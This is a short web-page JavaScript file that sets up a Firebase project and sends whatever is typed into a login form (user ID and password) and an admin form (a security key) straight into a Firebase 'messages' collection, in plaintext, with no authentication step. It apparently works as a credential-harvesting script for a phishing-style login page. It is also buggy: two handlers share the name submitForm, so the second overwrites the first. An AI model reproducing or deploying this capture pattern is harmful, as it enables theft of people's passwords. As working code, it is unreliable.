//Baisc Firebase configuration
var firebaseConfig = {
  apiKey: "AIzaSyBb6TPQdPILoQujZfRGSjzG48TQZy8pQfI",
  authDomain: "door-16c1f.firebaseapp.com",
  projectId: "door-16c1f",
  storageBucket: "door-16c1f.appspot.com",
  messagingSenderId: "992560373407",
  appId: "1:992560373407:web:c4cbdea0b713bda2220caa",
  measurementId: "G-2Y1KQTB8N9",
};
// Initialize Firebase
firebase.initializeApp(firebaseConfig);
firebase.analytics();

//refernce for message collection
let messageRef = firebase.database().ref("messages");

//Listen for form submission
document.getElementById("loginForm").addEventListener("submit", submitForm);

function submitForm(event) {
  event.preventDefault();
  // console.log("submitted!");

  var userid = getInputVal("usr");
  var password = getInputVal("pwd");

  // send values to saveMessage function to save the values to firebase
  saveMessage(userid, password);

  // console.log(userid);
  // console.log(password);
}

// Listen for admin form submission
document.getElementById("adminForm").addEventListener("submit", submitForm);

function submitForm(event) {
  event.preventDefault();
  // console.log("submitted!");

  var securityKey = getInputVal("sKey");

  // send values to saveMessage function to save the values to firebase
  saveMessage(securityKey);

  // console.log(userid);
  // console.log(password);
}

// function to give back input values from their id's
function getInputVal(id) {
  return document.getElementById(id).value;
}

//save messages to firebase
function saveMessage(userid, password) {
  var newMessageRef = messageRef.push();
  newMessageRef.set({
    userid: userid,
    password: password,
  });
}
// change bg color of button on click
$("button").on("click", function () {
  $("button").css("background-color", "#8dcbf1");
  // give delay while changing button color to give "click" effect
  setTimeout(function () {
    $("button").css("background-color", "#bbdcf1");
  }, 50);
});
